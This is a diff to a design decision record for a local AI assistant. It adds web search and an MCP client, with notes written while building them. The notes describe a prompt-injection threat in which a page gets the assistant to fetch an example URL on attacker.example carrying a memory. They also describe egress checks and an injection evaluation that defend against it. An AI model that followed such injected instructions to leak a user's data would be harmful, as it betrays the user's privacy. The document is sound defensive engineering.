@@ -1,8 +1,9 @@
 # ADR 0003: Connected (web search and local MCP servers)
 
 - **Status:** accepted by the owner, 2026-10-11, including the rule that a turn which
-  read web or MCP content makes every action that isn't `safe` ask first. Nothing in it
-  is built yet.
+  read web or MCP content makes every action that isn't `safe` ask first. Web search
+  ships in 0.35.0; the MCP client is next (0.36.0). The dated notes at the end record
+  what was decided while building it.
 - **Changes a security promise:** ARCHITECTURE §18 says the only connection the backend
   makes is to Ollama on 127.0.0.1, the README says nothing leaves the machine, and her
   persona tells the model "Everything stays on this computer." Web search breaks all
@@ -135,3 +136,44 @@ aside by the owner in favour of waiting.
   it.
 - The app gets its first screen for a tool's permission (ask, allow, deny), used first by
   MCP tools, through the existing `PUT /capabilities/{name}/policy`.
+
+## Notes while building
+
+### 2026-10-13: web search in 0.35.0
+
+- **What leaves is checked before it leaves** (`kernel/egress.py`). Both web tools are
+  `safe`, so the rule for actions after the web didn't touch them, and a page could have
+  her read `https://attacker.example/?d=<a memory>` unasked: the request is the leak. A
+  call that reaches the network now asks for an address nobody gave her (the user wrote
+  it, or a search in the conversation returned it), for anything that reads as a
+  secret, and, best effort, for four words in a row of the user's own memory or files.
+  The first is the real defence; the other two back it up.
+- **How often** is capped per turn and per minute (`kernel/budget.py`), and the gates
+  are one decision (`kernel/verdict.py`), read by both `execute` and
+  `requires_confirmation`, where the after-the-web rule had been added to one only.
+- **No new dependency.** The page reader is a tokenizer of our own (`page_text.py`),
+  linear in the page: the standard library's parser, which the first version used, took
+  31 s on 40 KB of `<a `. The ADR expected an HTML-to-text library; none was needed.
+  Decoding is ours too (gzip and deflate in bounded steps), since `httpx` decodes
+  without a bound.
+- **Fetching** pins the checked address for the connection, keeps no connection,
+  cookie or proxy between sites, and never follows https down to http.
+- **A web reply carries its source** into later turns, on replay and on calls, and
+  learning leaves it out: before, a page's words she repeated could be filed as the
+  user's.
+- **The `web` vector** joins the injection evaluation (`eval/injection/web_cases.jsonl`):
+  a page read in chat, a search on a call. On qwen3.5:9b, three runs, nothing on the web
+  ran unasked; the only instruction acted on was a file write, which asks by its policy
+  ([ARCHITECTURE §12.4](../../ARCHITECTURE.md#124-policy)).
+- **The window's floor** (`MIN_PROMPT_TOKENS`) is raised to 5,888: with the web's rules
+  and tools the largest chat prompt measures 5,691 tokens, and the floor sized without
+  them left no room for a message.
+
+### 2026-10-13: the MCP client, decided ahead of 0.36.0
+
+The spike's question is answered by reading, not by trying the SDK: its stdio
+transport starts servers with `asyncio` subprocesses (bug 14), and the protocol's
+current version (2026-07-28) is stateless where earlier ones are not, so a client must
+speak both. Option 3 is chosen: a small client of our own over `subprocess.Popen`,
+speaking the current version and falling back to the older one, with the server held
+in a Windows job object so it can't outlive her. No SDK dependency.
